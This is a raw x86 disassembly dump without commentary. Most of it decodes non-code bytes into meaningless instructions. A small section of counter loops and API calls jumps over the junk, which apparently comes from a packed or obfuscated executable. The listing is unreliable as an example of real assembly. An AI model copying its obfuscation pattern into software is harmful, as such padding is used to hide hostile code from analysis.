  418fc2:	idiv   BYTE PTR [eax+ecx*1+0x21c201c8]
  418fc9:	mov    ebp,0x3c642967
  418fce:	xor    DWORD PTR [edi],ebx
  418fd0:	add    al,BYTE PTR [ebp+0x75b4f99d]
  418fd6:	add    BYTE PTR [ecx+0x6e],ah
  418fd9:	inc    edi
  418fda:	add    eax,DWORD PTR [edx+0x24]
  418fdd:	in     al,0x3e
  418fdf:	adc    al,dh
  418fe1:	shr    DWORD PTR [ecx-0x48a0609b],1
  418fe7:	dec    edx
  418fe8:	push   cs
  418fe9:	xor    bl,bh
  418feb:	sbb    esp,DWORD PTR [ebp+0x480d5f61]
  418ff1:	or     ebp,DWORD PTR [ebp-0x7a]
  418ff4:	lahf   
  418ff5:	push   edx
  418ff6:	mov    ecx,0x3eb95343
  418ffb:	call   0xec40912b
  419000:	loopne 0x418fda
  419002:	fs gs inc esp
  419005:	mov    eax,ebx
  419007:	lea    edi,ds:0xa96a30c7
  41900d:	sub    al,0x64
  41900f:	bound  esp,QWORD PTR [ecx]
  419011:	jl     0x418ff3
  419013:	loopne 0x419062
  419015:	dec    ebx
  419016:	push   es
  419017:	xor    ch,BYTE PTR [eax+0x5a9c4f4a]
  41901d:	test   DWORD PTR [esi],edx
  41901f:	ror    BYTE PTR ds:0xe62dd0fc,cl
  419025:	xlat   BYTE PTR ds:[ebx]
  419026:	imul   edx,DWORD PTR [ebx],0x193c9952
  41902c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41902d:	dec    ebp
  41902e:	mov    cl,0x3e
  419030:	mov    ecx,ebx
  419032:	cmp    BYTE PTR ds:0xa460db56,ch
  419038:	inc    eax
  419039:	mov    ah,0x57
  41903b:	push   esp
  41903c:	ins    DWORD PTR es:[edi],dx
  41903d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41903e:	cmp    edx,DWORD PTR [eax+0x7c]
  419041:	mov    DWORD PTR [edi],ecx
  419043:	lock fld TBYTE PTR [ecx-0x5c]
  419047:	add    DWORD PTR [eax+0x3b],ebp
  41904a:	xor    eax,0x65ae2fd9
  41904f:	sub    BYTE PTR [edi-0x3c],ah
  419052:	aaa    
  419053:	or     bl,BYTE PTR ds:0xac42f8d4
  419059:	or     edx,eax
  41905b:	mov    ?,WORD PTR [edi+0x60]
  41905e:	xchg   edx,eax
  41905f:	add    BYTE PTR [ebp+edx*8-0x14],ch
  419063:	es and al,0x37
  419066:	push   ds
  419067:	repnz sbb eax,ebx
  41906a:	mov    esp,0xa34dfdad
  41906f:	fsincos 
  419071:	dec    ecx
  419072:	sbb    edi,DWORD PTR [esi-0x26]
  419075:	sti    
  419076:	int3   
  419077:	push   ebx
  419078:	(bad)  
  419079:	(bad)  
  41907a:	pusha  
  41907b:	xchg   ebp,eax
  41907c:	lods   eax,DWORD PTR ds:[esi]
  41907d:	pop    edi
  41907e:	and    BYTE PTR [esi],bh
  419080:	out    dx,al
  419081:	(bad)  
  419082:	les    ebx,FWORD PTR [esi-0x34a25855]
  419088:	leave  
  419089:	push   ecx
  41908a:	iret   
  41908b:	mov    ah,0x3
  41908d:	xchg   ebp,eax
  41908e:	cmp    ecx,ebp
  419090:	outs   dx,BYTE PTR ds:[esi]
  419091:	icebp  
  419092:	sub    ah,cl
  419094:	(bad)  
  419095:	outs   dx,DWORD PTR ds:[esi]
  419096:	mov    ebx,0x2200639e
  41909b:	jmp    0xff19132b
  4190a0:	std    
  4190a1:	(bad)  
  4190a2:	in     eax,dx
  4190a3:	retf   0x791c
  4190a6:	adc    eax,0x5e9a6d61
  4190ab:	lahf   
  4190ac:	sbb    DWORD PTR [eax-0x28e33e8c],edx
  4190b2:	pushf  
  4190b3:	mov    DWORD PTR [esi+edx*8-0x668ce392],0x701ddb14
  4190be:	les    ecx,FWORD PTR [esi]
  4190c0:	or     BYTE PTR [esi-0x55],dh
  4190c3:	mov    ah,0xd7
  4190c5:	outs   dx,BYTE PTR ds:[esi]
  4190c6:	out    0xf5,eax
  4190c8:	inc    ecx
  4190c9:	mov    eax,ds:0x289cd2e7
  4190ce:	sub    DWORD PTR [ebp-0x61],0xa
  4190d2:	inc    edi
  4190d3:	jne    0x4190e2
  4190d5:	jecxz  0x419127
  4190d7:	inc    ebp
  4190d8:	gs loop 0x4190ca
  4190db:	fst    QWORD PTR ds:0x628d2eb8
  4190e1:	cdq    
  4190e2:	rcr    DWORD PTR [ebp+0x5178e0ed],1
  4190e8:	imul   ecx,DWORD PTR [eax-0x614749cf],0x43
  4190ef:	dec    ecx
  4190f0:	(bad)  
  4190f1:	not    DWORD PTR [ecx+0x6e]
  4190f4:	loopne 0x41909a
  4190f6:	retf   
  4190f7:	mov    ah,0x9
  4190f9:	inc    esi
  4190fa:	push   esi
  4190fb:	in     eax,0x50
  4190fd:	aad    0x70
  4190ff:	test   cl,dh
  419101:	lods   eax,DWORD PTR ds:[esi]
  419102:	xchg   BYTE PTR [ebx+edx*1+0x74],bh
  419106:	jmp    0xf647:0x62ab416f
  41910d:	jns    0x419100
  41910f:	ds mov eax,0xd9fa6108
  419115:	cs repz pop ds
  419118:	jl     0x419162
  41911a:	popa   
  41911b:	xlat   BYTE PTR ds:[ebx]
  41911c:	into   
  41911d:	inc    esi
  41911e:	inc    ebx
  41911f:	(bad)  [edi-0x9]
  419122:	fstp   DWORD PTR [edi+0xe]
  419125:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419126:	mov    dh,0x77
  419128:	(bad)  
  419129:	jge    0x4190f7
  41912b:	test   DWORD PTR [esi],ebp
  41912d:	xor    eax,DWORD PTR [ecx]
  41912f:	pusha  
  419130:	cmp    ebp,ebp
  419132:	test   eax,0x5350f625
  419137:	test   eax,0x43b2b45b
  41913c:	inc    esi
  41913d:	je     0x419136
  41913f:	test   eax,0x676eb5b9
  419144:	icebp  
  419145:	mov    dl,0x2e
  419147:	or     eax,0x77f235fa
  41914c:	mov    ecx,ss
  41914e:	shl    BYTE PTR [edx],1
  419150:	mov    eax,0xf2409916
  419155:	test   BYTE PTR ds:0x9142e2f3,dl
  41915b:	add    DWORD PTR [ebx-0x1fa49800],edi
  419161:	add    ch,BYTE PTR ds:0x1cd11f9d
  419167:	mov    DWORD PTR [ebx],ebp
  419169:	jmp    0x364a:0x39e007e9
  419170:	enter  0x5b6a,0xca
  419174:	ins    DWORD PTR es:[edi],dx
  419175:	jmp    0x11da34e4
  41917a:	push   ebx
  41917b:	inc    ebx
  41917c:	jne    0x4191b4
  41917e:	push   edi
  41917f:	not    DWORD PTR [eax-0x67e517fb]
  419185:	inc    esp
  419186:	push   ss
  419187:	inc    edx
  419188:	loopne 0x4191bd
  41918a:	call   eax
  41918c:	jmp    0x419194
  419191:	mov    eax,DWORD PTR [ebp+0x10]
  419194:	leave  
  419195:	ret    0xc
  419198:	push   ebp
  419199:	mov    ebp,esp
  41919b:	sub    esp,0x30
  41919e:	jmp    0x4193d3
  4191a3:	rcl    edx,cl
  4191a5:	ret    0xc13e
  4191a8:	into   
  4191a9:	rcl    ecx,cl
  4191ab:	daa    
  4191ac:	jle    0x419228
  4191ae:	mov    ss,WORD PTR [ecx+0x8a8ae71]
  4191b4:	lds    edi,FWORD PTR [edi+0x78]
  4191b7:	adc    BYTE PTR [esi+0x78],bh
  4191ba:	js     0x41914f
  4191bc:	outs   dx,BYTE PTR ds:[esi]
  4191bd:	dec    esp
  4191be:	push   edx
  4191bf:	inc    edx
  4191c0:	or     DWORD PTR [ecx-0x46],edi
  4191c3:	mov    DWORD PTR [ebp+0x2f48d1ca],ebp
  4191c9:	call   0x7575c7d3
  4191ce:	cwde   
  4191cf:	fdivp  st(0),st
  4191d1:	pusha  
  4191d2:	out    0x6c,eax
  4191d4:	xor    dh,dh
  4191d6:	popa   
  4191d7:	push   0x7e5c0b61
  4191dc:	fwait
  4191dd:	sub    BYTE PTR [ecx],bl
  4191df:	ret    
  4191e0:	dec    ebx
  4191e1:	addr16 sub eax,0xbcdf7013
  4191e7:	pop    esi
  4191e8:	jnp    0xf4d8f110
  4191ee:	cmc    
  4191ef:	inc    esp
  4191f0:	cmp    ch,BYTE PTR ds:0x10ec5217
  4191f6:	xlat   BYTE PTR ds:[ebx]
  4191f7:	push   ss
  4191f8:	mov    dh,0x2
  4191fa:	ja     0x4191c9
  4191fc:	push   ecx
  4191fd:	ins    BYTE PTR es:[edi],dx
  4191fe:	xor    eax,0x7268d901
  419203:	gs inc ebx
  419205:	push   esi
  419206:	pop    ss
  419207:	stc    
  419208:	ret    
  419209:	fs sahf 
  41920b:	hlt    
  41920c:	pushf  
  41920d:	push   ss
  41920e:	gs adc al,0x9e
  419211:	cli    
  419212:	mov    bl,BYTE PTR ds:0xf9c27c77
  419218:	shl    DWORD PTR [esi+0xe],0x1b
  41921c:	inc    ecx
  41921d:	and    eax,0xb1abea5c
  419222:	inc    ebp
  419223:	ud2    
  419225:	or     eax,0xc860ff02
  41922a:	inc    eax
  41922b:	sub    ah,BYTE PTR [esi-0x7ea03929]
  419231:	pusha  
  419232:	xor    al,0x11
  419234:	xchg   esi,eax
  419235:	lea    ecx,[ecx-0x78b2fba1]
  41923b:	sbb    ch,BYTE PTR [edi-0x22]
  41923e:	jns    0x41929e
  419240:	push   0xf
  419242:	adc    eax,0xb4e0f2af
  419247:	xor    BYTE PTR [ebp-0x294452dd],bl
  41924d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41924e:	inc    ecx
  41924f:	pop    ds
  419250:	sub    eax,0x24666f83
  419255:	dec    esp
  419256:	loop   0x41921b
  419258:	mov    es,WORD PTR [esi-0x27472f9a]
  41925e:	and    edx,DWORD PTR [edx-0x29]
  419261:	cli    
  419262:	mov    si,?
  419265:	adc    bl,BYTE PTR [esi-0x5a6c18f0]
  41926b:	inc    esp
  41926c:	xor    dl,BYTE PTR [edx+0x52]
  41926f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419270:	clc    
  419271:	jno    0x4192e6
  419273:	and    eax,0x5c66718c
  419278:	sbb    eax,0xcd9a7872
  41927d:	int    0x95
  41927f:	dec    edx
  419280:	and    eax,0x532af6b1
  419285:	call   0xe7ec:0x97ef4ed
  41928c:	and    al,0x24
  41928e:	rol    DWORD PTR [esi-0x10],1
  419291:	sbb    DWORD PTR [edi-0x59d050d2],ebx
  419297:	sbb    al,0x84
  419299:	or     BYTE PTR [edx-0x7294e234],dh
  41929f:	xchg   edi,eax
  4192a0:	cld    
  4192a1:	sahf   
  4192a2:	ror    BYTE PTR [ebx-0x19],0x93
  4192a6:	dec    edx
  4192a7:	call   0x6611:0x53f7f2e9
  4192ae:	ja     0x419272
  4192b0:	xchg   edi,eax
  4192b1:	out    dx,eax
  4192b2:	cdq    
  4192b3:	push   edi
  4192b4:	fsubr  QWORD PTR [ebp-0x61]
  4192b7:	retf   
  4192b8:	sub    edi,DWORD PTR [ebp-0x4a]
  4192bb:	lahf   
  4192bc:	or     DWORD PTR [esi+0xb],0xe10b5da1
  4192c3:	mov    ss,WORD PTR [esi]
  4192c5:	rcr    DWORD PTR [ebp+0x7094791],0x40
  4192cc:	sub    bh,BYTE PTR [ebp+0x3]
  4192cf:	aaa    
  4192d0:	imul   esp,edx,0xffffff8c
  4192d3:	jbe    0x419341
  4192d5:	aas    
  4192d6:	jns    0x419344
  4192d8:	sub    ah,BYTE PTR [edx]
  4192da:	and    ecx,DWORD PTR [edx+0x6a969308]
  4192e0:	adc    eax,0xbc611c93
  4192e5:	sti    
  4192e6:	bound  ecx,QWORD PTR ds:0xb5be8778
  4192ec:	int    0x29
  4192ee:	scas   al,BYTE PTR es:[edi]
  4192ef:	or     edi,DWORD PTR ds:0x946e6ae3
  4192f5:	(bad)  
  4192f6:	sub    DWORD PTR [ebx+0x7a],eax
  4192f9:	pop    edx
  4192fa:	inc    edi
  4192fb:	stos   DWORD PTR es:[edi],eax
  4192fc:	jno    0x4192f0
  4192fe:	outs   dx,BYTE PTR ds:[esi]
  4192ff:	and    al,0x48
  419301:	rcl    DWORD PTR [esi-0x17],0x6d
  419305:	shl    BYTE PTR [eax],0x8a
  419308:	adc    dh,BYTE PTR [ebx]
  41930a:	xor    eax,0xf96fb8b9
  41930f:	stos   DWORD PTR es:[edi],eax
  419310:	nop
  419311:	pop    ebx
  419312:	pop    edx
  419313:	stos   BYTE PTR es:[edi],al
  419314:	ror    BYTE PTR [edx-0x13e0c0dc],0x2a
  41931b:	addr16 push eax
  41931d:	and    ecx,edi
  41931f:	xor    esp,DWORD PTR [ebp-0x1]
  419322:	add    dl,BYTE PTR [ebx]
  419324:	das    
  419325:	sub    al,BYTE PTR [ebp+0x60e1470d]
  41932b:	dec    esi
  41932c:	pop    eax
  41932d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41932e:	sbb    ecx,ebx
  419330:	test   eax,0xc19b2847
  419335:	lea    eax,[edx+ebp*1-0x684d6f9a]
  41933c:	jg     0x419397
  41933e:	out    0xe,al
  419340:	or     al,0x59
  419342:	inc    esp
  419343:	arpl   WORD PTR [esi-0x60],dx
  419346:	or     eax,0x73790b9d
  41934b:	jnp    0x4192d1
  41934d:	dec    ecx
  41934e:	pop    ds
  41934f:	aam    0xb1
  419351:	mov    eax,ds:0x6caf16a0
  419356:	shr    bh,0x39
  419359:	or     BYTE PTR [eax],dl
  41935b:	aas    
  41935c:	mov    WORD PTR [ebx],gs
  41935e:	xchg   edx,eax
  41935f:	jge    0x419319
  419361:	(bad)  
  419362:	mov    cl,BYTE PTR [ebx]
  419364:	stos   DWORD PTR es:[edi],eax
  419365:	mov    dh,BYTE PTR [eax-0x5d904862]
  41936b:	jle    0x419375
  41936d:	enter  0xab6c,0x60
  419371:	sub    DWORD PTR [ebp-0x4e2b73fe],0xffffff99
  419378:	dec    eax
  419379:	xchg   edx,eax
  41937a:	add    ebp,DWORD PTR [esi]
  41937c:	aam    0x15
  41937e:	dec    ebp
  41937f:	jnp    0x4193fe
  419381:	shl    DWORD PTR [esi+ecx*8+0x17],0x70
  419386:	dec    esp
  419387:	hlt    
  419388:	sahf   
  419389:	iret   
  41938a:	push   ss
  41938b:	mov    ah,0xb3
  41938d:	inc    edi
  41938e:	push   ebx
  41938f:	jnp    0x41939c
  419391:	ins    DWORD PTR es:[edi],dx
  419392:	mov    cl,0xf0
  419394:	cmp    BYTE PTR [ecx+0x116d9df5],cl
  41939a:	lods   eax,DWORD PTR ds:[esi]
  41939b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41939c:	adc    DWORD PTR [ecx-0x35ed3888],0x7b23b89
  4193a6:	adc    DWORD PTR [ecx+esi*2],esp
  4193a9:	pop    esp
  4193aa:	dec    edi
  4193ab:	push   esi
  4193ac:	stos   DWORD PTR es:[edi],eax
  4193ad:	dec    eax
  4193ae:	adc    DWORD PTR ds:0xd393a647,ecx
  4193b4:	inc    edx
  4193b5:	mov    bh,0xf8
  4193b7:	inc    edi
  4193b8:	xchg   edx,eax
  4193b9:	sub    DWORD PTR [edi+edi*4-0x68],ecx
  4193bd:	adc    eax,0x35826247
  4193c2:	xor    DWORD PTR [esi+ebx*1-0x1b7ea117],0x9732b399
  4193cd:	and    esi,DWORD PTR [edi-0x7c]
  4193d0:	hlt    
  4193d1:	aam    0x5b
  4193d3:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  4193da:	and    DWORD PTR ds:0x42a87d,0x0
  4193e4:	xor    ecx,ecx
  4193e6:	add    ecx,DWORD PTR ds:0x42a87d
  4193ec:	inc    ecx
  4193ed:	mov    DWORD PTR ds:0x42a87d,ecx
  4193f3:	cmp    DWORD PTR ds:0x42a87d,0x24
  4193fa:	jne    0x41940b
  419400:	push   0x4f45
  419405:	call   DWORD PTR ds:0x41d278
  41940b:	cmp    DWORD PTR ds:0x42a87d,0x1b
  419412:	jb     0x4193e4
  419418:	and    DWORD PTR ds:0x42a801,0x0
  419422:	jmp    0x419434
  419427:	mov    ecx,DWORD PTR ds:0x42a801
  41942d:	inc    ecx
  41942e:	mov    DWORD PTR ds:0x42a801,ecx
  419434:	cmp    DWORD PTR ds:0x42a801,0x1d
  41943b:	jae    0x419470
  419441:	cmp    DWORD PTR ds:0x42a801,0x1e
  419448:	jne    0x419461
  41944e:	push   0x42a98f
  419453:	push   DWORD PTR [ebp-0x20]
  419456:	push   0x1
  419458:	push   DWORD PTR [ebp-0xc]
  41945b:	call   DWORD PTR ds:0x41d118
  419461:	jmp    0x419427
  419466:	adc    DWORD PTR ds:0x42a7b1,0x7c2
  419470:	mov    DWORD PTR [ebp-0x18],0xf89c8539
  419477:	and    DWORD PTR ds:0x42a80d,0x0
  419481:	mov    ecx,DWORD PTR ds:0x42a80d
  419487:	inc    ecx
  419488:	mov    DWORD PTR ds:0x42a80d,ecx
  41948e:	cmp    DWORD PTR ds:0x42a80d,0x25
  419495:	jne    0x4194a6
  41949b:	push   0x42aa48
  4194a0:	call   DWORD PTR ds:0x41d27c
  4194a6:	cmp    DWORD PTR ds:0x42a80d,0x18
  4194ad:	jb     0x419481
  4194b3:	mov    ecx,DWORD PTR [ebp-0x4]
  4194b6:	mov    eax,ds:0x42a805
  4194bb:	and    DWORD PTR ds:0x42a775,eax
  4194c1:	push   ebx
  4194c2:	add    ebx,ebx
  4194c4:	mov    eax,0x7510850
  4194c9:	and    DWORD PTR ds:0x42a76d,ecx
  4194cf:	xor    ecx,eax
  4194d1:	movzx  ebx,BYTE PTR ds:0x42a779
  4194d8:	adc    DWORD PTR ds:0x42a871,ebx
  4194de:	mov    ebx,0x327298
  4194e3:	adc    DWORD PTR ds:0x42a761,0x50ad
  4194ed:	add    ecx,ebx
  4194ef:	inc    DWORD PTR ds:0x42a87d
  4194f5:	mov    DWORD PTR [ebp-0x1c],ecx
  4194f8:	mov    ecx,DWORD PTR [ebp+0x14]
  4194fb:	push   esi
  4194fc:	mov    DWORD PTR ds:0x42a7f5,0x238f
  419506:	push   edi
  419507:	test   ecx,ecx
  419509:	mov    DWORD PTR ds:0x42a839,0x1f7e
  419513:	je     0x419758
  419519:	jmp    0x41974e
  41951e:	retf   0xd03c
  419521:	(bad)
  419524:	fld    st(3)
  419526:	scas   eax,DWORD PTR es:[edi]
  419527:	inc    eax
  419528:	adc    DWORD PTR [esi-0x35],eax
  41952b:	xchg   ebp,eax
  41952c:	lods   eax,DWORD PTR ds:[esi]
  41952d:	and    esp,DWORD PTR [eax]
  41952f:	retf   
  419530:	jg     0x4195aa
  419532:	adc    BYTE PTR [esi+0x78],bh
  419535:	js     0x41959b
  419537:	icebp  
  419538:	mov    esi,0x4cfdf050
  41953d:	(bad)  
  41953e:	imul   eax,DWORD PTR [edx+ecx*8-0x17],0x4e573d90
  419546:	sub    DWORD PTR [esi*8+0x118b4f08],eax
  41954d:	ret    
  41954e:	pop    ds
  41954f:	push   0xffffff96
  419551:	push   eax
  419552:	xlat   BYTE PTR ds:[ebx]
  419553:	call   0xd8b0:0x15903ca9
  41955a:	or     edx,ebx
  41955c:	adc    cl,bl
  41955e:	adc    ebx,DWORD PTR [ebx]
  419560:	int    0xc4
  419562:	addr16 jmp 0xd26d:0xa48842c5
  41956a:	or     BYTE PTR [ebx-0x17ae8665],dl
  419570:	(bad)  
  419571:	in     al,0x4d
  419573:	mov    ds:0xfb62e0d3,al
  419578:	mov    bl,0xe3
  41957a:	and    al,BYTE PTR [ebx-0x80]
  41957d:	in     eax,dx
  41957e:	repz xor eax,0x117b8e1f
  419584:	ds fs stos DWORD PTR es:[edi],eax
  419587:	arpl   WORD PTR [edx+0x61],bp
  41958a:	enter  0x2e1,0x74
  41958e:	sbb    DWORD PTR [edx],edx
  419590:	mov    bl,0xe6
  419592:	inc    ebp
  419593:	xlat   BYTE PTR ds:[ebx]
  419594:	push   ds
  419595:	mov    ch,0xd7
  419597:	push   ecx
  419598:	mov    eax,ds:0x1542a6ed
  41959d:	fdiv   DWORD PTR [edx]
  41959f:	repz push 0x50
  4195a2:	push   esp
  4195a3:	lea    eax,[esi-0x60]
  4195a6:	mov    eax,ds:0x200291b0
  4195ab:	mul    BYTE PTR [ebp-0x3b]
  4195ae:	cmp    al,0xed
  4195b0:	jae    0x419589
  4195b2:	or     al,0x22
  4195b4:	nop
  4195b5:	fsub   DWORD PTR [eax]
  4195b7:	test   DWORD PTR [esi+0x6228749e],0x39336461
  4195c1:	mov    eax,0xfeac5c99
  4195c6:	xchg   di,ax
  4195c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195ca:	jmp    0x65b2:0x23ef2cde
  4195d1:	fsub   QWORD PTR [ecx]
  4195d3:	inc    esp
  4195d4:	pop    edx
  4195d5:	test   edx,edx
  4195d7:	add    DWORD PTR [edx],esp
  4195d9:	or     esi,DWORD PTR [edx-0x4ab95fbf]
  4195df:	sbb    ebp,DWORD PTR [eax-0x23dd7bd4]
  4195e5:	mov    dh,0x2c
  4195e7:	lods   eax,DWORD PTR ds:[esi]
  4195e8:	(bad)  
  4195e9:	cwde   
  4195ea:	jae    0x4195a0
  4195ec:	add    eax,0x10a670b0
  4195f1:	adc    al,0xdc
  4195f3:	push   cs
  4195f4:	push   edx
  4195f5:	fwait
  4195f6:	cmp    eax,0x779ee172
  4195fb:	lods   eax,DWORD PTR ds:[esi]
  4195fc:	sbb    al,0x29
  4195fe:	sar    ebx,cl
  419600:	sbb    eax,0x20c9ed0e
  419605:	lock repz in al,0x92
  419609:	or     eax,0xdd2f54c2
  41960e:	dec    esi
  41960f:	xor    al,0xac
  419611:	dec    ecx
  419612:	pop    ebp
  419613:	xchg   eax,esp
  419615:	aaa    
  419616:	hlt    
  419617:	xlat   BYTE PTR ds:[ebx]
  419618:	pop    ecx
  419619:	ret    
  41961a:	jae    0x4195dc
  41961c:	xor    al,0x7c
  41961e:	aaa    
  41961f:	mov    bh,BYTE PTR [ebp+0x740cef87]
  419625:	jnp    0x4195ec
  419627:	mov    eax,0xf0767b8b
  41962c:	enter  0x199d,0x1
  419630:	lods   al,BYTE PTR ds:[esi]
  419631:	pop    edi
  419632:	fnstenv [edx+0x7446d9a8]
  419638:	jne    0x419679
  41963a:	dec    ebp
  41963b:	xchg   DWORD PTR [ebx-0x4b35dc74],edi
  419641:	cmp    DWORD PTR [ebp-0x65573003],ebx
  419647:	test   DWORD PTR [edx],ebp
  419649:	mov    esp,0x24100425
  41964e:	jo     0x419621
  419650:	inc    eax
  419651:	inc    eax
  419652:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419653:	cs aam 0x87
  419656:	or     eax,0x8a8778eb
  41965b:	xchg   esp,eax
  41965c:	fistp  QWORD PTR [ecx]
  41965e:	xchg   ebx,eax
  41965f:	inc    esi
  419660:	test   ebp,esp
  419662:	std    
  419663:	xor    DWORD PTR [ebx-0x55],ecx
  419666:	or     BYTE PTR ds:0x5984646,0x57
  41966d:	inc    esp
  41966e:	test   al,0xae
  419670:	jp     0x4196a5
  419672:	ss mov bl,0xd8
  419675:	ret    
  419676:	sbb    BYTE PTR [edx+0x7ab14501],dl
  41967c:	rcr    ah,cl
  41967e:	ds std 
  419680:	call   0xdb53:0x6d06c352
  419687:	cmp    eax,0x14aab1ab
  41968c:	pop    ss
  41968d:	pop    ebx
  41968e:	jns    0x41965e
  419690:	push   ebp
  419691:	sbb    ah,cl
  419693:	fwait
  419694:	add    eax,0x6bb00f8e
  419699:	popf   
  41969a:	pop    eax
  41969b:	inc    edx
  41969c:	sbb    eax,0x284fd4a8
  4196a1:	dec    ecx
  4196a2:	or     edi,eax
  4196a4:	inc    eax
  4196a5:	sbb    esp,DWORD PTR [eax-0x29]
  4196a8:	faddp  st(6),st
  4196aa:	lock and BYTE PTR [ecx-0x30a5f299],bh
  4196b1:	push   edx
  4196b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196b3:	loop   0x4196c9
  4196b5:	mov    eax,0x67327d7c
  4196ba:	inc    edi
  4196bb:	push   ebx
  4196bc:	mov    dh,ah
  4196be:	mov    ds:0x959cb64b,al
  4196c3:	pop    ds
  4196c4:	dec    eax
  4196c5:	neg    DWORD PTR [ebp-0x51f34424]
  4196cb:	jmp    0x7a03:0x367dadf4
  4196d2:	in     al,dx
  4196d3:	inc    esi
  4196d4:	xchg   ebx,eax
  4196d5:	push   ebp
  4196d6:	loope  0x4196a5
  4196d8:	inc    esi
  4196d9:	mov    ebp,0xd320fcd6
  4196de:	scas   al,BYTE PTR es:[edi]
  4196df:	loop   0x419724
  4196e1:	jge    0x419704
  4196e3:	cmp    eax,0xfdbe2195
  4196e8:	sbb    al,0x61
  4196ea:	lock cdq 
  4196ec:	je     0x41970f
  4196ee:	sbb    BYTE PTR ds:0x24d65f47,cl
  4196f4:	mov    esp,0x27f2337a
  4196f9:	sbb    BYTE PTR [eax],dl
  4196fb:	mov    esi,0x301afc15
  419700:	in     al,dx
  419701:	sbb    BYTE PTR [ebp+0x54],al
  419704:	fs retf 0x4505
  419708:	xchg   esp,eax
  419709:	inc    ecx
  41970a:	(bad)
  41970e:	outs   dx,DWORD PTR ds:[esi]
  41970f:	dec    ecx
  419710:	and    BYTE PTR [ebx+0x3b],bl
  419713:	stos   BYTE PTR es:[edi],al
  419714:	jns    0x41969f
  419716:	xor    edi,DWORD PTR [edi]
  419718:	xor    eax,0x1609709
  41971d:	sbb    al,0x6
  41971f:	ss jns 0x4196e9
  419722:	jecxz  0x419712
  419724:	ss pop dx
  419727:	jecxz  0x4196cd
  419729:	inc    eax
  41972a:	rol    BYTE PTR [esp+eiz*4-0x28],1
  41972e:	jae    0x419773
  419730:	enter  0x6077,0xfb
  419734:	and    ah,BYTE PTR [edi]
  419736:	adc    eax,0xf2387249
  41973b:	rol    esi,1
  41973d:	cmovae eax,DWORD PTR [ebx]
  419740:	stos   DWORD PTR es:[edi],eax
  419741:	sahf   
  419742:	jge    0x4196e3
  419744:	cs pop ss
  419746:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419747:	arpl   dx,sp
  419749:	mov    edi,0x8638dde4
  41974e:	mov    ecx,DWORD PTR [ebp+0x14]
  419751:	add    esi,esi
  419753:	mov    ecx,DWORD PTR [ecx]
  419755:	mov    DWORD PTR [ebp-0x1c],ecx
  419758:	imul   edx,eax
  41975b:	xor    edi,DWORD PTR ds:0x42a801
  419761:	mov    ecx,0x4573
  419766:	add    edx,ecx
  419768:	sub    DWORD PTR ds:0x42a87d,ecx
  41976e:	mov    esi,0x7879
  419773:	mov    edi,0x1556
  419778:	not    DWORD PTR ds:0x42a845
  41977e:	xchg   esi,ecx
  419780:	add    DWORD PTR ds:0x42a7b5,0x585c
  41978a:	jmp    0x4199bf
  41978f:	iret   
  419790:	iret   
  419791:	(bad)  
  419792:	xlat   BYTE PTR ds:[ebx]
  419793:	(bad)  
  419794:	xlat   BYTE PTR ds:[ebx]
  419795:	iret   
  419796:	xlat   BYTE PTR ds:[ebx]
  419797:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419798:	call   0xf70fddeb
  41979d:	xor    ah,bh
  41979f:	cmp    cl,cl
  4197a1:	jg     0x41981b
  4197a3:	adc    BYTE PTR [esi+0x78],bh
  4197a6:	js     0x41972a
  4197a8:	pop    ss
  4197a9:	out    dx,eax
  4197aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197ab:	int    0xc8
  4197ad:	inc    ebp
  4197ae:	push   ecx
  4197af:	ret    
  4197b0:	or     eax,0xa8fa5a5d
  4197b5:	push   0x74f22f05
  4197ba:	mov    dl,0xda
  4197bc:	dec    ebp
  4197bd:	retf   0xa7cc
  4197c0:	dec    esi
  4197c1:	int    0x55
  4197c3:	add    al,0x9
  4197c5:	jnp    0x419813
  4197c7:	iret   
  4197c8:	or     eax,0x43ae0b71
  4197cd:	cdq    
  4197ce:	mov    ebp,ds
  4197d0:	or     eax,0x53d46127
  4197d5:	and    eax,0x75f5841e
  4197da:	and    BYTE PTR [edx-0x81af3d],al
  4197e0:	sub    cl,BYTE PTR [eax+0x7]
  4197e3:	xchg   ebx,eax
  4197e4:	(bad)  
  4197e5:	into   
  4197e6:	add    eax,0x14c76560
  4197eb:	imul   ebp,DWORD PTR ds:0x9500af75,0x38
  4197f2:	aam    0x64
  4197f4:	hlt    
  4197f5:	mov    eax,ds:0xe1419d5d
  4197fa:	(bad)  
  4197fb:	fwait
  4197fc:	ins    DWORD PTR es:[edi],dx
  4197fd:	pop    ecx
  4197fe:	jnp    0x4197fa
  419800:	xor    BYTE PTR [edx-0x7c],bl
  419803:	stos   DWORD PTR es:[edi],eax
  419804:	(bad)  
  419806:	in     eax,dx
  419807:	xor    eax,0xaf5ad22c
  41980c:	and    esi,DWORD PTR [edx+ebx*1]
  41980f:	cld    
  419810:	ret    0x101d
  419813:	test   al,0x7f
  419815:	ds fdiv st,st(3)
  419818:	repnz sbb BYTE PTR [edx],ch
  41981b:	jmp    0x52e6:0x5a53d8a9
  419822:	mov    al,ds:0xb3a71e4a
  419827:	mov    al,0x96
  419829:	shl    DWORD PTR [edi+0x65],1
  41982c:	xchg   esp,eax
  41982d:	cld    
  41982e:	or     ch,BYTE PTR [ebp-0x593a035a]
  419834:	std    
  419835:	(bad)  
  419836:	sub    al,0x4
  419838:	jmp    0xb3af:0xd7e7c1db
  41983f:	mov    ds:0xb657f1dd,eax
  419844:	sahf   
  419845:	sub    esp,DWORD PTR [edi]
  419847:	adc    bl,dh
  419849:	cdq    
  41984a:	fst    DWORD PTR [ebp+edx*2-0x6b5013d2]
  419851:	cmp    eax,0x6f40d383
  419856:	push   0x60
  419858:	arpl   WORD PTR [ebx+0x17e901df],cx
  41985e:	dec    edi
  41985f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
